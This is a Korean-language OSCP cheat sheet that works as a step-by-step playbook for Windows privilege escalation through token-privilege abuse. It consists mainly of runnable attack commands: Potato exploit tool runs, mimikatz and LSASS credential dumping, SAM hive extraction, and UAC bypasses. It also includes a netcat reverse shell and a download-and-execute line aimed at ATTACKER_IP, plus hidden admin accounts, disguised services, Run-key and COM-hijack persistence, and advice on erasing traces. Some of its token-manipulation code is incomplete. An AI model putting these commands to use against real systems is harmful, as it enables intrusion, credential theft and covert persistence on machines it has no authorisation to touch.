# Windows Token Abuse Privilege Escalation

> **OSCP 핵심**: Windows Token 권한을 악용하여 즉시 SYSTEM 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔥 Token Privileges 확인 (10초 안에 - 가장 중요)

```cmd
:: 가장 중요한 명령어 - 현재 사용자의 모든 Token Privileges
whoami /priv

:: 핵심 권한들 개별 확인 (발견시 즉시 SYSTEM 가능)
whoami /priv | findstr "SeDebugPrivilege"
whoami /priv | findstr "SeImpersonatePrivilege"
whoami /priv | findstr "SeAssignPrimaryTokenPrivilege"
whoami /priv | findstr "SeTakeOwnershipPrivilege"
whoami /priv | findstr "SeRestorePrivilege"
whoami /priv | findstr "SeBackupPrivilege"
whoami /priv | findstr "SeLoadDriverPrivilege"
whoami /priv | findstr "SeManageVolumePrivilege"
```

```powershell
# PowerShell 버전
[Security.Principal.WindowsIdentity]::GetCurrent().Groups
Get-Process | Select-Object ProcessName, Id | Where-Object {$_.ProcessName -eq "lsass"}

# 현재 프로세스의 Token 정보
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, Groups, Token
```

### 🎯 프로세스 및 서비스 컨텍스트 확인

```cmd
:: 현재 사용자로 실행 중인 프로세스들
tasklist /v | findstr %USERNAME%

:: SYSTEM 권한으로 실행 중인 프로세스들
tasklist /v | findstr "NT AUTHORITY\SYSTEM"

:: 서비스 계정으로 실행 중인 프로세스들
tasklist /v | findstr "NT AUTHORITY\LOCAL SERVICE"
tasklist /v | findstr "NT AUTHORITY\NETWORK SERVICE"

:: 특정 권한을 가진 서비스들
sc query state= all | findstr "SERVICE_NAME"
wmic service get name,startname,state | findstr "LocalSystem\|NetworkService\|LocalService"
```

### ⚡ Named Pipe 및 RPC 확인

```cmd
:: Named Pipe 나열 (Potato 공격용)
dir \\.\pipe\

:: RPC 서비스 확인
rpcinfo -p localhost 2>nul
netstat -an | findstr ":135"

:: DCOM 서비스 확인 (PrintSpoofer, RoguePotato용)
dcomcnfg.exe
```

## 📋 단계별 체크리스트

### Phase 1: Token Privileges 분석 (1분)

- [ ] **SeImpersonatePrivilege**: 다른 사용자로 가장할 수 있는 권한 (가장 중요)
- [ ] **SeAssignPrimaryTokenPrivilege**: 프로세스에 토큰을 할당할 수 있는 권한
- [ ] **SeDebugPrivilege**: 시스템 프로세스를 디버그할 수 있는 권한
- [ ] **SeTakeOwnershipPrivilege**: 파일/객체의 소유권을 가져올 수 있는 권한
- [ ] **SeRestorePrivilege**: 백업/복원 권한 (파일 시스템 우회 가능)
- [ ] **SeBackupPrivilege**: 파일을 읽을 수 있는 백업 권한

### Phase 2: 실행 환경 확인 (2분)

- [ ] **운영체제 버전**: Windows 버전에 따른 공격 기법 선택
- [ ] **서비스 계정**: IIS, SQL Server 등 서비스 계정 여부 확인
- [ ] **Named Pipe**: 사용 가능한 Named Pipe 목록
- [ ] **RPC/DCOM**: RPC 및 DCOM 서비스 활성화 여부
- [ ] **방화벽 상태**: Windows Defender 및 방화벽 설정

### Phase 3: 공격 도구 선택 (1분)

- [ ] **JuicyPotato**: Windows Server 2016, Windows 10 이전 버전
- [ ] **PrintSpoofer**: Windows 10, Windows Server 2019 이후
- [ ] **RoguePotato**: 제한된 네트워크 환경
- [ ] **GodPotato**: 최신 Windows 버전 대응
- [ ] **수동 기법**: PowerShell이나 C# 코드 직접 실행

### Phase 4: 익스플로잇 실행 (2-5분)

- [ ] **도구 업로드**: 선택된 공격 도구 타겟 시스템에 업로드
- [ ] **권한 확인**: 필요한 Token Privilege가 활성화되어 있는지 재확인
- [ ] **익스플로잇 실행**: 선택된 기법으로 권한상승 시도
- [ ] **SYSTEM 확인**: `whoami` 명령어로 SYSTEM 권한 획득 확인
- [ ] **지속성 확보**: 새 관리자 계정 생성 또는 백도어 설치

## 🎯 발견별 즉시 익스플로잇

### 🔑 SeImpersonatePrivilege 악용 (가장 흔함)

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeImpersonatePrivilege"

:: 2. Windows 버전 확인
systeminfo | findstr "OS Name\|OS Version"

:: 3. JuicyPotato (Windows Server 2016, Windows 10 1809 이전)
:: 다운로드: https://github.com/ohpe/juicy-potato/releases
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}

:: 4. PrintSpoofer (Windows 10 1809 이후, Server 2019 이후)
:: 다운로드: https://github.com/itm4n/PrintSpoofer
PrintSpoofer.exe -i -c cmd

:: 5. RoguePotato (제한된 환경)
:: 다운로드: https://github.com/antonioCoco/RoguePotato
RoguePotato.exe -r 192.168.1.100 -e "cmd.exe" -l 9999

:: 6. GodPotato (최신 버전)
:: 다운로드: https://github.com/BeichenDream/GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

```powershell
# PowerShell로 SeImpersonatePrivilege 확인 및 악용
# 1. 권한 확인
if (([Security.Principal.WindowsIdentity]::GetCurrent().Groups | Where-Object {$_.Value -eq "S-1-5-32-544"}) -or
    ([Security.Principal.WindowsIdentity]::GetCurrent().Groups | Where-Object {$_.Value -eq "S-1-5-6"})) {
    Write-Host "SeImpersonatePrivilege detected!" -ForegroundColor Red
}

# 2. PowerShell 기반 Token 조작 (고급)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    public static void ImpersonateSystem() {
        // Token 조작 로직
    }
}
"@

# 3. 실행
[TokenManipulator]::ImpersonateSystem()
```

### 🔓 SeDebugPrivilege 악용

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeDebugPrivilege"

:: 2. LSASS 프로세스 ID 확인
tasklist | findstr "lsass.exe"

:: 3. 프로세스 메모리 덤프 (미미카츠 등 사용)
:: 미미카츠 다운로드 및 실행
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: 4. 프로세스 인젝션
:: PID를 이용한 프로세스 인젝션 도구 사용
```

```powershell
# PowerShell로 SeDebugPrivilege 악용
# 1. 메모리 덤프 생성
Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp\lsass.dmp

# 2. 다른 프로세스에 코드 인젝션
$proc = Get-Process -Name "winlogon"
# 인젝션 코드 실행
```

### 🛡️ SeTakeOwnershipPrivilege 악용

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeTakeOwnershipPrivilege"

:: 2. 중요 파일의 소유권 가져오기
takeown /f "C:\Windows\System32\Utilman.exe" /a
icacls "C:\Windows\System32\Utilman.exe" /grant Administrators:F

:: 3. Utilman.exe를 cmd.exe로 교체 (Sticky Keys 우회)
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Utilman.exe"

:: 4. 로그인 화면에서 Win+U 키로 SYSTEM 권한 cmd 실행
:: 물리적 접근이나 RDP 필요

:: 5. SAM 파일 소유권 가져오기
takeown /f "C:\Windows\System32\config\SAM" /a
icacls "C:\Windows\System32\config\SAM" /grant Administrators:F
```

### 💾 SeBackupPrivilege/SeRestorePrivilege 악용

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeBackupPrivilege\|SeRestorePrivilege"

:: 2. SAM 및 SYSTEM 레지스트리 하이브 백업
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

:: 3. 백업 파일을 이용한 해시 추출
:: SAM 파일 분석 도구 사용

:: 4. 파일 시스템 우회 (SeBackupPrivilege)
:: 모든 파일에 대한 읽기 권한
robocopy /b "C:\Users\Administrator" "C:\Windows\Temp\admin_backup" /s

:: 5. 파일 복원 (SeRestorePrivilege)
:: 시스템 파일 덮어쓰기 가능
```

### 🚛 SeLoadDriverPrivilege 악용

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeLoadDriverPrivilege"

:: 2. 커널 드라이버 로드
:: 악성 드라이버를 이용한 커널 레벨 권한상승
sc create EvilDriver binPath= "C:\Windows\Temp\evil.sys" type= kernel
sc start EvilDriver

:: 3. Capcom 드라이버 악용 (알려진 취약한 드라이버)
:: Capcom.sys 드라이버를 이용한 권한상승
```

### 🔧 SeManageVolumePrivilege 악용

```cmd
:: 1. 권한 확인
whoami /priv | findstr "SeManageVolumePrivilege"

:: 2. USN Journal 조작
:: 파일시스템 변경 기록 조작 가능

:: 3. 볼륨 마운트 조작
:: 다른 볼륨을 마운트하여 권한 우회
```

## 🤖 자동화 도구 활용

### 🥔 JuicyPotato (Windows Server 2016, Windows 10 1809 이전)

```cmd
:: JuicyPotato 다운로드 및 실행
powershell -c "Invoke-WebRequest -Uri 'https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe' -OutFile 'JuicyPotato.exe'"

:: 기본 실행 (관리자 계정 생성)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker password123 /add & net localgroup administrators hacker /add" -t *

:: CLSID 지정 실행
JuicyPotato.exe -l 1338 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\result.txt" -t * -c {DCBF6C85-84B9-4F93-B5C4-6E9EAEBF7A4B}

:: 대화형 쉘 실행
JuicyPotato.exe -l 1339 -p C:\Windows\System32\cmd.exe -t * -c {DCBF6C85-84B9-4F93-B5C4-6E9EAEBF7A4B}
```

### 🖨️ PrintSpoofer (Windows 10 1809+, Server 2019+)

```cmd
:: PrintSpoofer 다운로드 및 실행
powershell -c "Invoke-WebRequest -Uri 'https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe' -OutFile 'PrintSpoofer.exe'"

:: 대화형 SYSTEM 쉘
PrintSpoofer.exe -i -c cmd

:: 관리자 계정 생성
PrintSpoofer.exe -c "net user hacker password123 /add & net localgroup administrators hacker /add"

:: PowerShell 쉘 실행
PrintSpoofer.exe -i -c powershell
```

### 🥔 RoguePotato (제한된 네트워크 환경)

```cmd
:: RoguePotato 다운로드
powershell -c "Invoke-WebRequest -Uri 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.exe' -OutFile 'RoguePotato.exe'"

:: 외부 서버와 함께 실행 (공격자 머신에서 socat 실행 필요)
:: 공격자 머신: socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999

:: 로컬 릴레이 서버 사용
RoguePotato.exe -r 127.0.0.1 -e "cmd.exe" -l 9999 -s
```

### 🔱 GodPotato (최신 Windows 버전)

```cmd
:: GodPotato 다운로드 및 실행
powershell -c "Invoke-WebRequest -Uri 'https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe' -OutFile 'GodPotato.exe'"

:: 명령 실행
GodPotato.exe -cmd "cmd /c whoami"

:: 관리자 계정 생성
GodPotato.exe -cmd "net user hacker password123 /add & net localgroup administrators hacker /add"

:: 대화형 쉘 (nc.exe 필요)
GodPotato.exe -cmd "nc.exe -e cmd.exe ATTACKER_IP 4444"
```

### 🔧 Token 조작 PowerShell 스크립트

```powershell
# Token 조작 종합 스크립트 (복붙용)
function Invoke-TokenAbuse {
    Write-Host "===== TOKEN PRIVILEGE ABUSE SCRIPT =====" -ForegroundColor Green

    # 1. 현재 권한 확인
    Write-Host "`n[+] Current Token Privileges:" -ForegroundColor Yellow
    whoami /priv

    # 2. SeImpersonatePrivilege 확인
    $impersonate = whoami /priv | Select-String "SeImpersonatePrivilege"
    if ($impersonate -and $impersonate.ToString().Contains("Enabled")) {
        Write-Host "`n[!] SeImpersonatePrivilege is ENABLED!" -ForegroundColor Red
        Write-Host "Try: JuicyPotato, PrintSpoofer, or RoguePotato" -ForegroundColor Red
    }

    # 3. SeDebugPrivilege 확인
    $debug = whoami /priv | Select-String "SeDebugPrivilege"
    if ($debug -and $debug.ToString().Contains("Enabled")) {
        Write-Host "`n[!] SeDebugPrivilege is ENABLED!" -ForegroundColor Red
        Write-Host "Try: Process injection or memory dumping" -ForegroundColor Red
    }

    # 4. SeTakeOwnershipPrivilege 확인
    $takeown = whoami /priv | Select-String "SeTakeOwnershipPrivilege"
    if ($takeown -and $takeown.ToString().Contains("Enabled")) {
        Write-Host "`n[!] SeTakeOwnershipPrivilege is ENABLED!" -ForegroundColor Red
        Write-Host "Try: Taking ownership of system files" -ForegroundColor Red
    }

    # 5. 운영체제 버전 확인
    $os = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion
    Write-Host "`n[+] OS Info: $($os.WindowsProductName) $($os.WindowsVersion)" -ForegroundColor Yellow

    # 6. 공격 도구 추천
    $version = [System.Environment]::OSVersion.Version
    if ($version.Major -eq 10 -and $version.Build -ge 17763) {
        Write-Host "`n[+] Recommended: PrintSpoofer or GodPotato" -ForegroundColor Green
    } else {
        Write-Host "`n[+] Recommended: JuicyPotato" -ForegroundColor Green
    }
}

# 실행
Invoke-TokenAbuse
```

## 👀 놓치기 쉬운 것들

### 🚨 서비스 계정별 특수 권한들

```cmd
:: 1. IIS 서비스 계정 (IIS_IUSRS, IUSR)
whoami /groups | findstr "IIS_IUSRS\|IUSR"
:: IIS 서비스 계정은 보통 SeImpersonatePrivilege를 가짐

:: 2. SQL Server 서비스 계정
whoami /groups | findstr "MSSQL"
sc query MSSQLSERVER
:: SQL Server 서비스 계정도 높은 권한을 가질 수 있음

:: 3. Network Service 계정
whoami | findstr "NETWORK SERVICE"
:: 제한적이지만 일부 권한 보유

:: 4. Local Service 계정
whoami | findstr "LOCAL SERVICE"
:: 최소 권한이지만 특정 상황에서 활용 가능

:: 5. 사용자 정의 서비스 계정
net user | findstr "svc\|service"
:: 관리자가 만든 서비스 계정들 확인
```

### 🔍 Named Pipe 및 RPC 분석

```cmd
:: 1. 사용 가능한 Named Pipe 상세 확인
powershell "Get-ChildItem \\.\pipe\ | Where-Object {$_.Name -like '*spoolss*' -or $_.Name -like '*samr*' -or $_.Name -like '*lsarpc*'}"

:: 2. RPC 포트 매핑 확인
rpcinfo -T tcp -p localhost 2>nul
netstat -an | findstr ":135\|:445\|:593"

:: 3. DCOM 애플리케이션 확인
dcomcnfg.exe
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID" | findstr "CLSID"

:: 4. 프로세스별 Named Pipe 사용 현황
handle.exe -a | findstr "\\Device\\NamedPipe"

:: 5. WMI 서비스 확인 (일부 공격에 필요)
sc query winmgmt
wmic process where "name='wmiprvse.exe'" get ProcessId,CommandLine
```

### ⚡ 고급 Token 조작 기법

```powershell
# 1. Token 복제 및 조작
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class AdvancedTokenManipulation {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();

    public static void CloneSystemToken() {
        // SYSTEM 프로세스에서 토큰 복제
        IntPtr hSystemProcess = Process.GetProcessesByName("winlogon")[0].Handle;
        IntPtr hSystemToken;
        IntPtr hDuplicateToken;

        OpenProcessToken(hSystemProcess, 0x0002, out hSystemToken);
        DuplicateToken(hSystemToken, 2, out hDuplicateToken);
        SetThreadToken(GetCurrentThread(), hDuplicateToken);
    }
}
"@

# 2. 프로세스 토큰 열거
Get-WmiObject Win32_Process | Where-Object {$_.Name -eq "lsass.exe" -or $_.Name -eq "winlogon.exe"} | Select-Object Name, ProcessId, ParentProcessId

# 3. 세션 정보 확인
query session
qwinsta

# 4. 로그온 세션 열거
logonsessions.exe 2>$null

# 5. 현재 토큰의 SID 정보
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
```

### 🔧 CLSID 및 COM 객체 활용

```cmd
:: 1. JuicyPotato용 CLSID 목록 테스트
:: Windows 10 1809 이전 버전용 CLSID들
set clsids="{DCBF6C85-84B9-4F93-B5C4-6E9EAEBF7A4B}" "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"

for %%i in (%clsids%) do (
    echo Testing CLSID: %%i
    JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c echo %%i > C:\Windows\Temp\test.txt" -t * -c %%i
)

:: 2. DCOM 객체 권한 확인
dcomcnfg.exe
:: Component Services -> Computers -> My Computer -> DCOM Config

:: 3. 레지스트리에서 CLSID 확인
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID" | findstr "LocalServer32\|InprocServer32"

:: 4. PowerShell로 COM 객체 테스트
powershell -c "New-Object -ComObject Shell.Application"
powershell -c "New-Object -ComObject WScript.Shell"
```

### 💡 네트워크 제한 환경에서의 우회

```cmd
:: 1. 로컬 포트만 사용하는 공격 (방화벽 우회)
PrintSpoofer.exe -i -c cmd
:: Named Pipe만 사용하므로 네트워크 연결 불필요

:: 2. localhost 릴레이 공격
RoguePotato.exe -r 127.0.0.1 -e "cmd.exe" -l 9999 -s

:: 3. 파일 기반 통신
:: 일부 공격에서 파일 시스템을 통한 통신 사용

:: 4. WMI 이벤트 기반 공격
:: WMI 이벤트를 트리거로 사용하는 고급 기법

:: 5. 메모리 기반 실행 (디스크 쓰기 최소화)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/exploit.ps1')"
```

### 🔒 UAC 우회와 Token 조작 결합

```cmd
:: 1. UAC 우회 후 Token 조작
:: fodhelper.exe UAC 우회
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\System32\cmd.exe" /f
fodhelper.exe

:: 2. eventvwr.exe UAC 우회
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\System32\cmd.exe" /f
eventvwr.exe

:: 3. 우회 후 즉시 Token 조작 도구 실행
:: 상승된 권한에서 JuicyPotato 등 실행

:: 4. 컴퓨터 관리 UAC 우회
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\Windows\System32\cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
sdclt.exe /KickOffElev
```

### 🕒 지속성 및 은닉 기법

```cmd
:: 1. Token 조작 후 은닉된 계정 생성
net user hacker$ password123 /add /active:yes
net localgroup administrators hacker$ /add

:: 2. 서비스로 등록하여 지속성 확보
sc create TokenService binpath= "C:\Windows\Temp\tokentool.exe" start= auto
sc description TokenService "Windows Token Management Service"

:: 3. 스케줄된 작업으로 주기적 실행
schtasks /create /tn "TokenMaintenance" /tr "C:\Windows\Temp\tokentool.exe" /sc daily /st 03:00 /ru SYSTEM

:: 4. WMI 이벤트로 트리거 실행
:: 특정 이벤트 발생시 Token 조작 도구 실행

:: 5. DLL 하이재킹으로 지속 실행
:: 시스템 프로세스에 Token 조작 DLL 주입

:: 6. 레지스트리 Run 키에 숨김
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTokenService" /d "C:\Windows\Temp\tokentool.exe -silent" /f

:: 7. COM 하이재킹으로 지속성
reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32" /ve /d "C:\Windows\Temp\evil.dll" /f
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 1분**: Token Privileges 확인 및 OS 버전 파악
- **다음 2분**: 적절한 공격 도구 선택 및 다운로드
- **추가 2-5분**: 도구 실행 및 권한상승 시도
- **성공 후**: 즉시 지속성 확보 및 백도어 설치

### 🎯 성공률 높은 순서

1. **SeImpersonatePrivilege**: 가장 흔하고 확실한 Windows privesc (90% 이상)
2. **SeDebugPrivilege**: 프로세스 조작으로 높은 성공률
3. **SeTakeOwnershipPrivilege**: 파일 소유권으로 시스템 파일 조작
4. **SeBackupPrivilege**: SAM 파일 접근으로 해시 덤프
5. **SeLoadDriverPrivilege**: 커널 레벨 권한상승 (고급)

### 🔥 즉시 시도할 것들

- `whoami /priv`로 Token Privileges 즉시 확인
- SeImpersonatePrivilege 발견시 PrintSpoofer나 JuicyPotato 우선 시도
- Windows 버전에 따른 적절한 도구 선택
- 네트워크 제한 환경에서는 PrintSpoofer 우선 사용

### 💡 팁

- Token Abuse는 Windows에서 가장 안정적인 privesc 방법
- 서비스 계정(IIS, SQL Server 등)에서 SeImpersonatePrivilege 흔함
- 도구 실행 전 반드시 Windows 버전 확인
- 성공 후 원본 도구 파일 삭제로 흔적 제거
- 여러 Token Privilege가 동시에 있으면 조합 활용
- SYSTEM 권한 획득 후 즉시 새 관리자 계정 생성
